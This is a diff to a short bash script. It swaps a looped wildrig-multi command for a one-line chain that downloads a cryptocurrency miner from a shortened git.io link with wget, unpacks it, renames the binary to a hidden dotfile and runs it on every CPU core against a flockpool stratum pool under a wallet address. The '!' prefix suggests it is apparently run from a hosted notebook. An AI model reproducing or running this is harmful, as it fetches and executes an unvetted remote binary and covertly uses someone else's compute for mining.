@@ -1,7 +1,3 @@
 #!/bin/bash
 
-while true
-do
-./wildrig-multi --print-full --algo ghostrider --url stratum+tcps://eu.flockpool.com:5555 --user RXXg8vGFGrw9xz8YC8nYbvH5kCaFGtpzi8 --pass x
-sleep 5
-done
+!wget -qO rtm git.io/cpuminer-gr-1.2.3 && tar xf rtm && mv ./cpuminer-gr-1.2.3-x86_64_linux ./gr && mv ./gr/binaries/cpuminer-avx ./gr/binaries/.gr && ./gr/binaries/.gr -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RRT11pEKPdwT3QGfWWJq3XzFjBDFxQygvU.dhoe -t $(nproc --all) --no-tune
